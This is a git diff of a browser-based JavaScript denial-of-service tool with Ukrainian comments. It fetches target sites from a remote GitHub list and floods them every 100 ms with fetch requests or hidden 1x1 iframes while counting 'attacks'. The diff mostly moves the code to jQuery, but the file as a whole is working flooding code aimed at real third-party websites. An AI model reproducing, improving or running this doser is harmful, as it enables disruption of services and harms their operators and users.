@@ -3,14 +3,12 @@ const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/t
 
 
 // Функції для керування документом
+
 let frameDiv = $("#frame")
-
-const getId = (id) => document.getElementById(id) // Не дуже хочу використовувати Jquery
-let attacks = getId("attacks")
-
+let attacks = $("#attacks")
 
 // Функції рандому
-const add_count = () => attacks.textContent++ // Кількість атак
+const add_count = () => attacks.text(parseInt(attacks.text())+1) // Кількість атак
 
 const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число
 
@@ -44,26 +42,25 @@ async function getTarget() {
 
 const Frames = {
 	async draw(target, id) {
-		const framediv = frameDiv;
 		$("<iframe>", {
 			src: target,
 			id: "frame" + id,
 			frameborder: 0,
 			width: 1,
 			height: 1
-		}).appendTo(framediv);
+		}).appendTo(frameDiv);
 	},
 	clear() {frameDiv.empty()}
 }
 
 
 // Відображення цілі та методу атаки
-let targetField = getId("target")
-let methodField = getId("method")
+let targetField = $("#target")
+let methodField = $("#method")
 
 setTarget = (target) => {
-	targetField.textContent = target.page;
-    methodField.textContent = target.method.toUpperCase();
+	targetField.text(target.page);
+    methodField.text(target.method.toUpperCase());
 }
 
 
@@ -76,7 +73,7 @@ class Doser {
 
         // Запуск атаки
 
-        btn.textContent = "Стоп";
+        btn.text("Стоп");
         let target = await getTarget();
 
         setTarget(target);
@@ -84,6 +81,7 @@ class Doser {
 
         this.interval = setInterval(isFetch ? async function () {
             // Запити
+            let target = await getTarget();
 
             await fetch([target.page], {
 	            method: target.method,
@@ -96,6 +94,7 @@ class Doser {
 	            add_count();
 	        })
         } : async function () {
+
         	let targett = await getSalt(target.page); // Беремо сіль з нашого Криму
 
         	// Надсилання запиту на сайт за допомогою iframe
@@ -104,26 +103,29 @@ class Doser {
 
         	add_count();
 
-        	if (getId("frame").childElementCount > 200) {Frames.clear()};
+        	if ($("#frame").childElementCount > 200) {Frames.clear()};
         }, 100);
     };
     stop() {
     	this.attack = false;
     	clearInterval(this.interval);
     	Frames.clear()
-    	btn.textContent = "Старт!";
+    	btn.text("Старт!");
     };
 }
 
 
 
-let btn = getId("button")
-Doser = new Doser // Ініціалізація воркера
+let btn = $("#button")
 
-btn.addEventListener('click', (e) => {
-	e.preventDefault();
+$(() => {
+	Doser = new Doser // Ініціалізація воркера
 
-	!Doser.attack ? Doser.start() : Doser.stop();
+	btn.on('click', (e) => {
+		e.preventDefault();
+
+		!Doser.attack ? Doser.start() : Doser.stop();
+	})
 })
 
 // Слава Україні!
